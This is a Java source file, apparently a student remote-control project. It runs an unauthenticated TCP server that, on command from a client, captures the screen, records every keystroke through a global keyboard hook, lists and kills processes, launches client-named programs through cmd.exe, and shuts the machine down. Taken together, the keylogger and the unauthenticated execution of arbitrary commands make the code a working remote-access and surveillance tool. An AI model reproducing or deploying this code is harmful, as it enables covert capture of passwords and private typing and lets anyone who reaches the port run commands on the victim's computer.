package socket;



import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Scanner;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import javax.imageio.ImageIO;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;



public class Server {
	
	
	public final static int SERVER_PORT = 8888;
	static ArrayList<String> list = new ArrayList<String>();
	static int demsolanchaythread = 1;
	
	
	
	
	static Thread thread = new Thread() {
	        public void run() {
	        	try{
					
	   		 		GlobalScreen.registerNativeHook();
	   		 		GlobalScreen.addNativeKeyListener(new NativeKeyListener(){

	   		        @Override
	   		        public void nativeKeyTyped(NativeKeyEvent nativeEvent){}

	   		         @Override
	   		         public void nativeKeyReleased(NativeKeyEvent nativeEvent){
	   		             String keyText=NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()).toLowerCase();
		   		         
	   	    	         list.add(keyText);
   	    	        
		   	    	      
	   		         }
	   		         @Override
	   		         public void nativeKeyPressed(NativeKeyEvent nativeEvent){}
	   		 		});
	       		 }
	       		 catch (NativeHookException e){
	       		     e.printStackTrace();
	       		 }
	        }
	    };

	
	public void server() throws AWTException, InterruptedException, NativeHookException 
    {
		
		
        try 
        {

        	@SuppressWarnings("resource")
			ServerSocket server = new ServerSocket(SERVER_PORT);
        
            Socket socket =server.accept();
            
            BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintStream ps = new PrintStream(socket.getOutputStream());
            
        
           
            while (true)
            {
            	int i = 0;
            	
            	 String request = br.readLine();
                 
                 if(request != null)
                 {
                 	
                     System.out.println("Receive from a client: "+ request);
                     
                    
                    
                     i = Integer.parseInt(request);
                     
                     
                     if(i == 1)
                     {
                    	 
                     	 //ps.println(" CHup man hinh ");
                    	 screen(br, ps);
                     
                     }
                     else if(i==2)
                     {
                     	//ps.println(" list process");
                    	 listprocess(br, ps);
                     	
                     
                     }
                     else if(i==3)
                     {
                     	
                    	 Killprocess(br, ps);
                     	
                     	
                     }
                     else if(i==4)
                     {
                     	// start a process
                    	 Startprocess(br,ps);
                     }
                     else if(i==5)
                     {
                   	  //ps.println(" Lam Viec 5");
                   	  // xem process
                   	  //do nothing
                   	  
                   	  
                     }
                     else if(i==6)
                     {
                    	// list app
                    	 listapp(br, ps);
                    	 
                     
                     }
                     else if(i==7)
                     {
                    	//kill app
                      Killapp(br, ps);
                    	 
                   	  
                     }
                     else if(i==8)
                     {
                    	 //start app
                    	 Startapp(br, ps);
                     }
                     else if(i==9)
                     {
                    	// xoa man hinh
                   	  
                     }
                     
                     else if(i==10 )
                     {
                    	 
                    	 keylog(br, ps);

                    		
                     }
                     else if(i==12)
                     {
                    	 Shutdown();
                       
                     }
                     else if(i==100)
                     {
                    	 socket.close();
                    	 System.exit(0);
                    	 break;
                     }
                     else
                     {
                     	break;
                     }
                     
                        
            
                 }
                 System.out.println("da ket thuc 3");
                 
            }
            
            
            
          
          
            
        
        
        }
        catch(IOException e )
        {
            e.printStackTrace();
        } catch (NumberFormatException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
        

    }
	
	//===========================================================================================
	public void screen(BufferedReader br, PrintStream ps) throws AWTException, IOException
	{
		 String outFileName = "screen.jpg";
         



      	Toolkit toolkit = Toolkit.getDefaultToolkit();
      	Dimension screenSize = toolkit.getScreenSize();
      	Rectangle screenRect = new Rectangle(screenSize);
      	Robot robot = new Robot();

      	BufferedImage image = robot.createScreenCapture(screenRect);

      	ImageIO.write(image, "jpg", new File(outFileName));
      	 

      	
      	//===========================================================================
      	int j;
         
          FileInputStream fis = new FileInputStream ("screen.jpg");
          
          while ((j = fis.read()) > -1)
          {
         	 
         	 ps.println(j);
         	  
          }
          ps.println(j);
         
          fis.close();
          

        	
	}
	
	public void listprocess(BufferedReader br, PrintStream ps)
	{
		try {
     	    String line;
     	    @SuppressWarnings("deprecation")
			Process p = Runtime.getRuntime().exec
     	    (System.getenv("windir") +"\\system32\\"+"tasklist.exe");
     	    BufferedReader input =
     	            new BufferedReader(new InputStreamReader(p.getInputStream()));
     	    
     	  
     	    while ((line = input.readLine()) != null) 
     	    {
  	    	
     	    	ps.println(line);
     	        
     	    }
     	   line= "-1";
     	   ps.println(line);
     	     	 
     	    input.close();
     	    
           
     	} catch (Exception err)
     	{
     	    err.printStackTrace();
     	}
	}
	
	public void Killprocess(BufferedReader br, PrintStream ps) throws IOException
	{

     	String r = br.readLine();
     	 try
      	 {
      		 String k = "taskkill /PID " + r;
      		 
          	
          	@SuppressWarnings("unused")
			Process builder = new ProcessBuilder("cmd.exe", "/c", k ).start();
      	 }
          catch (NumberFormatException ex)
      	  {
              
          }
	}
	
	public void Startprocess(BufferedReader br, PrintStream ps)
	{
		 try
     	 {
     		String k = br.readLine();
     		
     		@SuppressWarnings("unused")
			Process process = new ProcessBuilder(k).start();
         } catch(IOException e)
     	 {
            e.printStackTrace();
         }
	}
	
	public void listapp(BufferedReader br, PrintStream ps) throws IOException, InterruptedException
	{
		Process process = new ProcessBuilder("powershell","\"gps| ? {$_.mainwindowtitle.length -ne 0} | Format-Table -HideTableHeaders  name, ID").start();
    	
    	new Thread(() -> 
       {
         Scanner sc = new Scanner(process.getInputStream());
         if (sc.hasNextLine()) sc.nextLine();
         
         
         String line;
         
         while (sc.hasNextLine())
         {
             line = sc.nextLine();
             ps.println(line);
         }
         line = "-1";
   	     ps.println(line);
         
     }).start();
       process.waitFor();
   
      
	}
	
	public void Killapp(BufferedReader br, PrintStream ps) throws IOException
	{
		String r = br.readLine();
     	 try
     	 {
     		 String k = "taskkill /PID " +r;
     		 
         	
         	@SuppressWarnings("unused")
			Process builder = new ProcessBuilder("cmd.exe", "/c", k ).start();
     	 }
         catch (NumberFormatException ex)
     	  {
             
         }
	}
	
	public void Startapp(BufferedReader br, PrintStream ps)
	{
		  try
          {
         	 String k = br.readLine();
         	 k = "start " + k;
         		
      		@SuppressWarnings("unused")
				Process builder = new ProcessBuilder("cmd.exe", "/c", k ).start();
      		
          }
          catch (IOException e)
          {
              e.printStackTrace();
          }
	}
	
	@SuppressWarnings("deprecation")
	public void Shutdown()
	{
		 Runtime runtime = Runtime.getRuntime();
         try
         {
            runtime.exec("shutdown -s -t 10");
         }
         catch(IOException e)
         {
            System.out.println("Exception: " +e);
         }
	}
	
	
	public void keylog(BufferedReader br, PrintStream ps) throws IOException, NativeHookException
	{
 		

 		list.clear();
 		list=new ArrayList<String>();
			if(demsolanchaythread == 1) {
				
				thread.start();
				demsolanchaythread++;
			}
		String keystroke = br.readLine();
		
   		if(Integer.parseInt(keystroke) == 11) {
	           	String listString = new String("");
	           
	           	for (String a : list){
	           		 listString += a ;
	           	}
	           	
	      
	           	ps.println(listString);
	           	
	           	ps.flush();
//	           	
   		}
//   		
   	}
	

	

	
	//====================================================================================
    
}
